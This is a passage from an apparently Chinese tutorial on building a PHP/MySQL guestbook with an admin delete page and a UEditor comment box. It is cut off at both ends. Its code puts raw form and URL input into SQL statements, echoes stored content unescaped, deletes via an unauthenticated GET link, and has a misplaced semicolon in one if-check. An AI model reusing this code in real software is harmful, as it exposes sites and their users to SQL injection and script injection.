class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>))&#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>))&#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br><br>            <span class="hljs-comment">//查询并显示留言列表</span><br>            <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;);&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;  <span class="hljs-comment">//用户名为空的情况</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>数据接收输出-html混编&amp;超全局变量</p><ol><li><p>新建后台目录和后台文件，专门用于管理留言</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/7d8cf827431a7364169dd011ddfc4e9d.png" alt="image-20240401222513673">​</p></li><li><p>由于管理留言麻烦，所以定义一个全局配置文件去连接数据库</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/736285b9983c60b46090e27429e5b6f3.png" alt="image-20240401222915919">​</p></li><li><p>在gbook文件里调用config文件</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/0e6ea04ef21f431c3cc3717af66606de.png" alt="image-20240402012402616">​</p></li><li><p>在gbook-admin文件里掉用上级目录config文件</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/17feda93401a63c84e1e1396c93ecc10.png" alt="image-20240402012453285">​</p></li><li><p>编写删除功能</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;   <span class="hljs-comment">//包含文件</span><br><br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href = &#x27;gbook-admin.php?del = <span class="hljs-subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt; &quot;</span>;   <span class="hljs-comment">//输出一个删除按钮，href写的是当前文件名，del是删除对象，值为用户名</span><br><br>&#125;<br><br><span class="hljs-variable">$delstr</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];     <span class="hljs-comment">//接收del的值，参数名位del</span><br><span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;delete from gbook where username = &#x27;<span class="hljs-subst">$delstr</span>&#x27;;&quot;</span>;<br>        <span class="hljs-comment">//接收完之后要重新组织SQL语句</span><br>        <span class="hljs-comment">//条件是表名为gbook，因为接收的是用户名，所以接收的列名是username，接收的值为delstr</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql2</span>));&#123;      <span class="hljs-comment">//执行该结果并将结果存储在data中,并判断一下返回结果</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编写留言成功显示功能</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//24-39行就是为了添加留言的功能</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$u</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>)) &#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) &#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//42-55行就是为了显示留言数据的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>))&#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_gbook</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>);<br><br></code></pre></td></tr></table></figure></li><li><p>精简代码逻辑，在gbook-admin中调用，测试前端页面无删除按钮，admin页面有删除按钮</p><p> <img src="/assets/image-20240627205827-0fa57pz.png" alt="image">​</p><p> <img src="/assets/image-20240627205841-9ud1wqw.png" alt="image">​</p></li></ol><p> ‍</p></li><li><p>第三方插件引用-js传参&amp;函数对象调用</p><ol><li>在demo01文件夹下创建ueditor文件夹，将ueditor文件放进去实现评论区图片的功能</li></ol><p> <img src="/assets/image-20240627210039-wxmifxk.png" alt="image">​</p><ol start="2"><li><p>编写编辑器实例化传参</p><p> <img src="/assets/image-20240627210211-y7otdb5.png" alt="image">​</p></li><li><p>去小皮面板建立站点，将路径指向源代码的位置，再打开网站</p><p> <img src="/assets/image-20240627210301-kejt0ne.png" alt="image">​</p><p> <img src="/assets/image-20240627210340-nxe4uvh.png" alt="image">​</p></li></ol></li><li><p>最终代码</p><p> gbook.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//调用ueditor</span><br>&lt;script src=<span class="hljs-string">&quot;/ueditor/ueditor.config.js&quot;</span>&gt;<span class="hljs-comment">/*引入配置文件*/</span>&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&quot;/ueditor/ueditor.all.js&quot;</span>&gt;<span class="hljs-comment">/*引入源码文件*/</span>&lt;/script&gt;<br><br><br><br>&lt;!-- <span class="hljs-number">9</span>-<span class="hljs-number">24</span>行都是前端显示界面 --&gt;<br><br>&lt;form id=<span class="hljs-string">&quot;form1&quot;</span> name=<span class="hljs-string">&quot;form1&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>    &lt;!-- action代表发送目标，留空就是自己；post就是提交数据 --&gt;<br><br>        用户名：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;&lt;br&gt;<br>        &lt;!-- 给name值，这是一个传参值，假如输入<span class="hljs-number">123</span>，那用户名就为<span class="hljs-number">123</span> --&gt;<br><br>    内容：<br><br>        &lt;textarea id=<span class="hljs-string">&quot;content&quot;</span> rows=<span class="hljs-string">&quot;10&quot;</span> cols=<span class="hljs-string">&quot;70&quot;</span> name=<span class="hljs-string">&quot;content&quot;</span> style=<span class="hljs-string">&quot;...&quot;</span>&gt;<br>        &lt;/textarea&gt;<br>        &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>            UE.<span class="hljs-title function_ invoke__">getEditor</span>(<span class="hljs-string">&quot;content&quot;</span>);<br>            <span class="hljs-comment">//实例化编辑器传参，ID为讲要被替换的容器</span><br>        &lt;/script&gt;<br><br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;sumbit&quot;</span> id=<span class="hljs-string">&quot;sumbit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br><br>&lt;/form&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;   <span class="hljs-comment">//与config.php共享代码</span><br><br><span class="hljs-comment">//30-45行就是为了添加留言的功能</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$u</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>)) &#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) &#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//48-61行就是为了显示留言数据的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span>,<span class="hljs-variable">$del</span></span>)</span>&#123;     <span class="hljs-comment">//设置参数</span><br>    <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>))&#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$del</span>==<span class="hljs-string">&#x27;del&#x27;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="hljs-subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;   <span class="hljs-comment">//输出这个值</span><br>         &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_gbook</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;x&#x27;</span>);   <span class="hljs-comment">//赋值一个错误值就不显示删除，由于52行没有输出x，所以不会显示删除按钮</span><br><br><br><br><br><span class="hljs-comment">//判断是否连接成功</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接错误：&quot;</span> .<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());      <span class="hljs-comment">//如果错误就提示，正确不提示</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$u</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>))&#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>))&#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br><br>            <span class="hljs-comment">//查询并显示留言列表</span><br>            <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;);&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;  <span class="hljs-comment">//用户名为空的情况</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p> config.php</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据库通信</span><br><span class="hljs-variable">$dbip</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbpass</span> = 